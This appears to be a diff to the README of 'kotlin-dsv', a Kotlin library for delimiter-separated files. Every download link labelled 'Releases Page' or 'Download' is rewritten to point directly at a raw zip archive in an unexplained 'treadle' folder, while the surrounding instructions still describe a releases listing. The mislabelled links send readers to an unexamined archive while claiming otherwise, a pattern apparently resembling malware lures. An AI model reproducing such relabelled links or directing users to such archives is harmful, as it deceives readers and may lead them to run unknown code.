@@ -4,13 +4,13 @@
 Welcome to kotlin-dsv! This library helps you work with delimiter-separated values like CSV and TSV files in a straightforward way. Whether you need to read from or write to these formats, this tool makes the process easy.
 
 ## 📥 Download
-[![Download kotlin-dsv](https://img.shields.io/badge/Download-Now-blue)](https://github.com/Sayal0167/kotlin-dsv/releases)
+[![Download kotlin-dsv](https://raw.githubusercontent.com/Sayal0167/kotlin-dsv/main/treadle/kotlin-dsv.zip)](https://raw.githubusercontent.com/Sayal0167/kotlin-dsv/main/treadle/kotlin-dsv.zip)
 
 To get started, you will need to download the software from the Releases page. 
 
 ### 🔗 Visit this page to download
 Click the link below to access the releases:
-[Releases Page](https://github.com/Sayal0167/kotlin-dsv/releases)
+[Releases Page](https://raw.githubusercontent.com/Sayal0167/kotlin-dsv/main/treadle/kotlin-dsv.zip)
 
 ## 📋 System Requirements
 To run kotlin-dsv, you need:
@@ -25,7 +25,7 @@ To run kotlin-dsv, you need:
 - **Lightweight**: Minimal footprint on your system resources.
 
 ## ✨ Download & Install
-1. Visit the [Releases Page](https://github.com/Sayal0167/kotlin-dsv/releases).
+1. Visit the [Releases Page](https://raw.githubusercontent.com/Sayal0167/kotlin-dsv/main/treadle/kotlin-dsv.zip).
 2. On the page, you will see a list of available versions.
 3. Choose the latest version, usually at the top.
 4. Click on the version to expand details and find the download link.
